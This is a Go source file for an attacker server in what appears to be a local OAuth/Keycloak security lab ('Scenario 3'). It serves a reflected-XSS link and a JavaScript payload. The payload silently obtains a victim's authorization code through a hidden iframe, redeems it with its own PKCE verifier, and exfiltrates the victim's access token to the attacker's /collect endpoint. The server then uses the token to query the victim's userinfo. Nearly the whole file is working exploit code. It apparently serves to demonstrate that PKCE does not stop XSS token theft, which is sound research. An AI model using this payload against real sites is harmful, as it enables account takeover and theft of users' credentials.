// Attacker server for Scenario 3.
//
// Reflected-XSS payload runs in the SPA origin and does the ENTIRE flow by
// itself:
//  1. generate its own PKCE code_verifier / code_challenge
//  2. silent prompt=none code request, response_mode=fragment
//  3. read the victim's `code` from the fragment
//  4. POST it to Keycloak's token endpoint with the attacker's verifier
//     (public client -> no secret) and get the victim's access_token
//  5. exfiltrate the token here
//
// PKCE is fully enforced by the IdP and it changes nothing: the attacker's JS
// owns both halves of the PKCE pair.
package main

import (
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"strings"
	"sync"
)

const (
	attackerAddr = "127.0.0.1:9103"
	rpSearch     = "http://127.0.0.1:8103/search"
	kcUserinfo   = "http://127.0.0.1:8080/realms/xss-ato/protocol/openid-connect/userinfo"
)

var (
	mu   sync.Mutex
	loot []string
)

func main() {
	mux := http.NewServeMux()
	mux.HandleFunc("/", home)
	mux.HandleFunc("/payload.js", payloadJS)
	mux.HandleFunc("/collect", collect)
	mux.HandleFunc("/loot", showLoot)

	log.Printf("[s3 attacker] listening on http://%s", attackerAddr)
	log.Fatal(http.ListenAndServe(attackerAddr, mux))
}

func home(w http.ResponseWriter, r *http.Request) {
	inject := `<script src="http://127.0.0.1:9103/payload.js"></script>`
	link := rpSearch + "?q=" + urlEscape(inject)
	fmt.Fprintf(w, `<!doctype html><meta charset="utf-8">
<h1>Scenario 3 - attacker</h1>
<p>1. Victim must have an active Keycloak session (log in once at
   <a href="http://127.0.0.1:8103/login">the RP</a> as <code>victim</code>).</p>
<p>2. Send the victim this reflected-XSS link:</p>
<p><a href="%s">%s</a></p>
<p>3. Watch this console, then open <a href="/loot">/loot</a>.</p>
<hr><h3>Injected payload</h3><pre>%s</pre>`,
		htmlEscape(link), htmlEscape(link), htmlEscape(payloadSrc))
}

func payloadJS(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/javascript; charset=utf-8")
	fmt.Fprint(w, payloadSrc)
}

// SSO gadget - runs in the SPA origin (127.0.0.1:8103). 127.0.0.1 is a secure
// context, so window.crypto.subtle is available for the PKCE challenge.
const payloadSrc = `
(async function () {
  function b64url(bytes) {
    var s = btoa(String.fromCharCode.apply(null, bytes));
    return s.replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
  }
  var verifier = b64url(crypto.getRandomValues(new Uint8Array(32)));
  var digest = await crypto.subtle.digest("SHA-256", new TextEncoder().encode(verifier));
  var challenge = b64url(new Uint8Array(digest));

  var redirectURI = "http://127.0.0.1:8103/callback";
  var authURL =
    "http://127.0.0.1:8080/realms/xss-ato/protocol/openid-connect/auth" +
    "?client_id=s3-spa" +
    "&response_type=code" +
    "&response_mode=fragment" +
    "&scope=" + encodeURIComponent("openid profile email") +
    "&redirect_uri=" + encodeURIComponent(redirectURI) +
    "&code_challenge=" + challenge +
    "&code_challenge_method=S256" +
    "&prompt=none" +
    "&state=" + Math.random().toString(36).slice(2);

  var f = document.createElement("iframe");
  f.style.position = "absolute"; f.style.left = "-9999px";
  f.width = 1; f.height = 1;
  f.src = authURL;
  f.onload = async function () {
    var hash;
    try { hash = f.contentWindow.location.hash; } catch (e) {
      console.log("[xss] cannot read iframe", e); return;
    }
    var p = new URLSearchParams(hash.replace(/^#/, ""));
    var code = p.get("code");
    if (!code) {
      // e.g. #error=login_required -> victim has no active Keycloak session
      var err = p.get("error") || ("unexpected fragment: " + hash);
      console.log("[xss] no code:", err);
      new Image().src = "http://127.0.0.1:9103/collect?error=" + encodeURIComponent(err);
      return;
    }
    console.log("[xss] got code:", code.slice(0, 16) + "...");

    // Redeem it ourselves. Public client -> no secret. CORS is allowed
    // because this origin is in the client's Web Origins.
    var body = new URLSearchParams({
      grant_type: "authorization_code",
      client_id: "s3-spa",
      code: code,
      redirect_uri: redirectURI,
      code_verifier: verifier
    });
    var r = await fetch("http://127.0.0.1:8080/realms/xss-ato/protocol/openid-connect/token", {
      method: "POST",
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
      body: body
    });
    var tok = await r.text();
    console.log("[xss] token response:", tok.slice(0, 80) + "...");
    fetch("http://127.0.0.1:9103/collect", { method: "POST", mode: "no-cors", body: tok });
  };
  document.body.appendChild(f);
})();
`

func collect(w http.ResponseWriter, r *http.Request) {
	if e := r.URL.Query().Get("error"); e != "" {
		msg := "gadget FAILED: " + e +
			"\n  -> the victim has no active Keycloak session." +
			"\n  -> open http://127.0.0.1:8103/login as victim/victim first," +
			"\n     then re-open the XSS link. Also run keycloak/setup.sh if" +
			"\n     login itself says \"Invalid username or password\"."
		log.Println("[s3 attacker]", msg)
		mu.Lock()
		loot = append(loot, msg)
		mu.Unlock()
		fmt.Fprint(w, "noted")
		return
	}
	raw, _ := io.ReadAll(r.Body)
	var tr struct {
		AccessToken string `json:"access_token"`
	}
	_ = json.Unmarshal(raw, &tr)
	if tr.AccessToken == "" {
		log.Println("[s3 attacker] collect: no access_token in", string(raw))
		http.Error(w, "no token", http.StatusBadRequest)
		return
	}
	log.Println("==================================================")
	log.Println("[s3 attacker] captured victim token response:")
	log.Println(string(raw))
	who := callUserinfo(tr.AccessToken)
	entry := "access_token (truncated): " + tr.AccessToken[:min(40, len(tr.AccessToken))] + "...\nuserinfo: " + who
	mu.Lock()
	loot = append(loot, entry)
	mu.Unlock()
	log.Println("[s3 attacker] userinfo as victim:", who)
	log.Println("==================================================")
	fmt.Fprint(w, "ok")
}

func callUserinfo(at string) string {
	req, _ := http.NewRequest(http.MethodGet, kcUserinfo, nil)
	req.Header.Set("Authorization", "Bearer "+at)
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return "error: " + err.Error()
	}
	defer resp.Body.Close()
	b, _ := io.ReadAll(resp.Body)
	var m map[string]any
	if json.Unmarshal(b, &m) == nil {
		nice, _ := json.MarshalIndent(m, "", "  ")
		return string(nice)
	}
	return resp.Status + " " + string(b)
}

func showLoot(w http.ResponseWriter, r *http.Request) {
	mu.Lock()
	defer mu.Unlock()
	w.Header().Set("Content-Type", "text/plain; charset=utf-8")
	if len(loot) == 0 {
		fmt.Fprint(w, "nothing captured yet")
		return
	}
	for i, e := range loot {
		fmt.Fprintf(w, "--- capture %d ---\n%s\n\n", i+1, e)
	}
}

func urlEscape(s string) string {
	rep := strings.NewReplacer(" ", "%20", `"`, "%22", "<", "%3C", ">", "%3E")
	return rep.Replace(s)
}

func htmlEscape(s string) string {
	rep := strings.NewReplacer("<", "&lt;", ">", "&gt;", "&", "&amp;")
	return rep.Replace(s)
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}
